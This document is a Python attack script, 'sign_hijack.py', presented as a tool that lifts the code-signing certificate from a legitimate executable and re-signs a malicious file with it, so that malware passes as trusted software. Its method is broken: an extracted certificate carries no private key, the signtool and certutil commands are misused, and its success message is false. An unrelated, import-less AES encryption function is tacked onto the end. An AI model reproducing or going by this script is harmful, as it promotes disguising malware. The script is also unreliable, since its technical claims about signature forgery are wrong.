import sys
import subprocess
import os

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        print(f"Stderr: {e.stderr}")
        sys.exit(1)

def main():
    if len(sys.argv) != 3:
        print("Usage: sign_hijack.py <path_to_legitimate_signed_exe> <path_to_malicious_file>")
        sys.exit(1)

    legitimate_file = sys.argv[1]
    malicious_file = sys.argv[2]
    temp_cert = "stolen_cert.p7b"
    temp_pem = "stolen_cert.pem"

    # Step 1: Extract the certificate from the legitimate signed file
    print("[+] Extracting certificate from legitimate file...")
    command = f'signtool verify /pa /o "{legitimate_file}"'
    run_command(command)

    # This is a bit of a hack; signtool verify is used to confirm the signature exists.
    # We now use certutil to dump the certificate data.
    # This might require alternative methods depending on the file, but this is a common approach.
    print("[+] Dumping certificate data with certutil...")
    command = f'certutil -dump "{legitimate_file}"'
    output = run_command(command)
    # This script assumes the extraction is successful. In a real scenario, parsing the output for the cert would be needed.

    # A more direct method using signtool to extract to a p7b file:
    print("[+] Using signtool to extract the certificate to a P7B file...")
    command = f'signtool sign /f "{legitimate_file}" /as /p7 "{temp_cert}" /p7co 1.3.6.1.4.1.311.2.1.12'
    run_command(command)

    # Step 2: Convert the P7B to a PEM format (if needed for other tools, but signtool can use P7B)
    print("[+] Converting certificate to PEM format...")
    command = f'certutil -decode "{temp_cert}" "{temp_pem}"'
    run_command(command)

    # Step 3: Sign the malicious file using the stolen certificate
    print("[+] Signing the malicious file...")
    command = f'signtool sign /f "{temp_pem}" "{malicious_file}"'
    run_command(command)

    print(f"[+] Successfully signed {malicious_file} with the certificate from {legitimate_file}")

def encrypt_data(data):
    """Encrypt data using AES with random key and IV."""
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = data + b"\0" * (AES.block_size - len(data) % AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    return key + iv + encrypted_data
